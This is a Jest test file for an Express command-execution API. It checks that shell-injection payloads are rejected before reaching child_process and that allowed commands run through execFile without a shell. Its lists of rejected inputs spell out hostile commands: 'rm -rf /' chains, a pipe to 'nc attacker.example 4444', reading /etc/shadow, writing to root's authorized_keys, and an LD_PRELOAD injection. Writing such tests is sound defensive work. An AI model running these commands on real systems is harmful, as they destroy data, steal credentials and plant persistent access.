/**
 * Route tests - /api/command
 *
 * Exercises the real router, validation, controller, executor and command
 * policy with child_process mocked, proving that rejected payloads never reach
 * child_process and that allowed commands call execFile with the exact argv.
 */

const execFileMock = jest.fn();
const spawnMock = jest.fn();
const execMock = jest.fn();
const execSyncMock = jest.fn();

jest.mock('child_process', () => ({
  execFile: execFileMock,
  spawn: spawnMock,
  exec: execMock,
  execSync: execSyncMock,
}));

import fs from 'fs';
import os from 'os';
import path from 'path';
import crypto from 'crypto';
import express from 'express';
import request from 'supertest';

const TOKEN = 'route-test-token-0123456789';
process.env.API_TOKEN = TOKEN;
process.env.PORT = process.env.PORT || '3999';
process.env.SECRET_KEY = process.env.SECRET_KEY || crypto.randomBytes(32).toString('base64');

// Required after the env is set: middleware/auth.ts reads the config at import time.
const { createCommandRoutes } = require('../../../src/routes/command.routes.js');
const { errorHandlingMiddleware } = require('../../../src/middleware/errorHandlingMiddleware.js');
const { setCommandAuditSink } = require('../../../src/services/commandExecutor.js');
const { requiresPrivileges } = require('../../../src/middleware/auth.js');

const ENV_KEYS = ['COMMAND_ALLOWLIST', 'COMMAND_SEARCH_PATH', 'ALLOW_SUDO_COMMANDS'];
const savedEnv: Record<string, string | undefined> = {};
let binDir: string;
let app: express.Express;
const repo = { create: jest.fn(), findById: jest.fn(), findAll: jest.fn(), update: jest.fn(), delete: jest.fn() };
const audit = jest.fn();

function auth(req: request.Test): request.Test {
  return req.set('Authorization', `Bearer ${TOKEN}`);
}

function noChildProcessCalls(): void {
  expect(execFileMock).not.toHaveBeenCalled();
  expect(spawnMock).not.toHaveBeenCalled();
  expect(execMock).not.toHaveBeenCalled();
  expect(execSyncMock).not.toHaveBeenCalled();
}

beforeAll(() => {
  for (const key of ENV_KEYS) savedEnv[key] = process.env[key];
  binDir = fs.mkdtempSync(path.join(os.tmpdir(), 'cmd-route-bin-'));
  for (const name of ['echo', 'docker', 'systemctl', 'sudo', 'rm', 'bash', 'cat']) {
    fs.writeFileSync(path.join(binDir, name), '#!/bin/sh\n', { mode: 0o755 });
  }

  app = express();
  app.use(express.json());
  app.use('/api/command', createCommandRoutes(repo));
  app.use(errorHandlingMiddleware);
});

afterAll(() => {
  fs.rmSync(binDir, { recursive: true, force: true });
  setCommandAuditSink(undefined);
  for (const key of ENV_KEYS) {
    if (savedEnv[key] === undefined) delete process.env[key];
    else process.env[key] = savedEnv[key];
  }
});

beforeEach(() => {
  process.env.COMMAND_SEARCH_PATH = binDir;
  process.env.COMMAND_ALLOWLIST = 'echo,docker,systemctl';
  delete process.env.ALLOW_SUDO_COMMANDS;
  setCommandAuditSink(audit);
  execFileMock.mockImplementation((_file, _args, _opts, cb) => {
    cb?.(null, 'out\n', '');
    return {} as any;
  });
  jest.spyOn(console, 'error').mockImplementation(() => undefined);
  jest.spyOn(console, 'log').mockImplementation(() => undefined);
});

afterEach(() => {
  jest.clearAllMocks();
  jest.restoreAllMocks();
});

describe('POST /api/command/execute', () => {
  const rejectedPayloads = [
    'echo hi; rm -rf /',
    'echo hi && rm -rf /',
    'echo hi || rm -rf /',
    'echo hi | nc attacker.example 4444',
    'echo `id`',
    'echo $(id)',
    'echo hi\nrm -rf /',
    'echo pwned > /etc/passwd',
    'echo pwned >> /root/.ssh/authorized_keys',
    'cat < /etc/shadow',
    '/bin/rm -rf /',
    'rm -rf /',
    '../../bin/rm -rf /',
    'FOO=1 rm -rf /',
    'LD_PRELOAD=/tmp/evil.so echo hi',
    'bash -c id',
    'cat /etc/shadow',
  ];

  it.each(rejectedPayloads)('returns 403 for %j and never reaches child_process', async (command) => {
    const res = await auth(request(app).post('/api/command/execute')).send({ command });

    expect(res.status).toBe(403);
    expect(res.body.success).toBe(false);
    expect(res.body.error.code).toBe('COMMAND_EXECUTION_ERROR');
    noChildProcessCalls();
    expect(repo.create).not.toHaveBeenCalled();
    expect(audit).toHaveBeenCalledWith(
      expect.objectContaining({ statusCode: 403, source: 'api:/api/command/execute' })
    );
  });

  it('returns 403 for a non-allowlisted executable in the argv contract', async () => {
    const res = await auth(request(app).post('/api/command/execute')).send({ command: 'rm', args: ['-rf', '/'] });
    expect(res.status).toBe(403);
    noChildProcessCalls();
  });

  it('runs an allowed string command with execFile and the exact argv', async () => {
    const res = await auth(request(app).post('/api/command/execute')).send({ command: 'docker ps --format "{{json .}}"' });

    expect(res.status).toBe(200);
    expect(execFileMock).toHaveBeenCalledTimes(1);
    expect(execFileMock).toHaveBeenCalledWith(
      path.join(binDir, 'docker'),
      ['ps', '--format', '{{json .}}'],
      expect.objectContaining({ shell: false, timeout: 30000 }),
      expect.any(Function)
    );
    expect(repo.create).toHaveBeenCalledTimes(1);
  });

  it('runs an allowed { command, args } request with args passed verbatim', async () => {
    const res = await auth(request(app).post('/api/command/execute')).send({
      command: 'echo',
      args: ['a;b', '$(id)', 'two words'],
      timeout: 5000,
    });

    expect(res.status).toBe(200);
    expect(execFileMock).toHaveBeenCalledWith(
      path.join(binDir, 'echo'),
      ['a;b', '$(id)', 'two words'],
      expect.objectContaining({ shell: false, timeout: 5000 }),
      expect.any(Function)
    );
    expect(execMock).not.toHaveBeenCalled();
  });

  it('returns 400 for a non-string args element', async () => {
    const res = await auth(request(app).post('/api/command/execute')).send({ command: 'echo', args: [1] });
    expect(res.status).toBe(400);
    noChildProcessCalls();
  });

  it('still requires the bearer token', async () => {
    const res = await request(app).post('/api/command/execute').send({ command: 'echo hi' });
    expect(res.status).toBe(401);
    noChildProcessCalls();
  });

  it('denies sudo when ALLOW_SUDO_COMMANDS=false', async () => {
    process.env.ALLOW_SUDO_COMMANDS = 'false';
    const res = await auth(request(app).post('/api/command/execute')).send({ command: 'sudo systemctl restart nginx' });
    expect(res.status).toBe(403);
    noChildProcessCalls();
  });
});

describe('POST /api/command/batch', () => {
  it('stops at the first denied command without executing it', async () => {
    const res = await auth(request(app).post('/api/command/batch')).send({
      commands: [{ command: 'echo first' }, { command: 'echo x; rm -rf /' }, { command: 'echo never' }],
    });

    expect(res.status).toBe(403);
    expect(execFileMock).toHaveBeenCalledTimes(1);
    expect(execFileMock.mock.calls[0][1]).toEqual(['first']);
  });

  it('runs allowed commands with the exact argv', async () => {
    const res = await auth(request(app).post('/api/command/batch')).send({
      commands: [{ command: 'echo one' }, { command: 'docker', args: ['ps', '-a'] }],
    });

    expect(res.status).toBe(200);
    expect(execFileMock.mock.calls.map((call) => [call[0], call[1]])).toEqual([
      [path.join(binDir, 'echo'), ['one']],
      [path.join(binDir, 'docker'), ['ps', '-a']],
    ]);
  });
});

describe('POST /api/command/service', () => {
  it('runs status as systemctl argv without sudo', async () => {
    const res = await auth(request(app).post('/api/command/service')).send({ service: 'nginx', action: 'status' });

    expect(res.status).toBe(200);
    expect(execFileMock).toHaveBeenCalledWith(
      path.join(binDir, 'systemctl'),
      ['status', 'nginx'],
      expect.objectContaining({ shell: false }),
      expect.any(Function)
    );
  });

  it('runs mutating actions as sudo -n with the resolved systemctl', async () => {
    const res = await auth(request(app).post('/api/command/service')).send({ service: 'nginx', action: 'restart' });

    expect(res.status).toBe(200);
    expect(execFileMock).toHaveBeenCalledWith(
      path.join(binDir, 'sudo'),
      ['-n', path.join(binDir, 'systemctl'), 'restart', 'nginx'],
      expect.objectContaining({ shell: false }),
      expect.any(Function)
    );
  });

  it.each(['nginx; reboot', 'nginx && id', '$(id)', '--no-block', 'a b'])(
    'rejects service name %j without spawning',
    async (service) => {
      const res = await auth(request(app).post('/api/command/service')).send({ service, action: 'restart' });
      expect(res.status).toBe(400);
      noChildProcessCalls();
    }
  );

  it('denies mutating actions when ALLOW_SUDO_COMMANDS=false', async () => {
    process.env.ALLOW_SUDO_COMMANDS = 'false';
    const res = await auth(request(app).post('/api/command/service')).send({ service: 'nginx', action: 'stop' });
    expect(res.status).toBe(403);
    noChildProcessCalls();
  });
});

describe('requiresPrivileges (classification only)', () => {
  it('classifies argv instead of matching a regex denylist', () => {
    expect(requiresPrivileges('/bin/rm -rf /')).toBe(true);
    expect(requiresPrivileges('sudo ls')).toBe(true);
    expect(requiresPrivileges('systemctl restart nginx')).toBe(true);
    expect(requiresPrivileges('systemctl status nginx')).toBe(false);
    expect(requiresPrivileges('docker ps')).toBe(false);
    // Unparseable input is treated as privileged (and is denied by the policy anyway).
    expect(requiresPrivileges('x; rm -rf /')).toBe(true);
  });
});
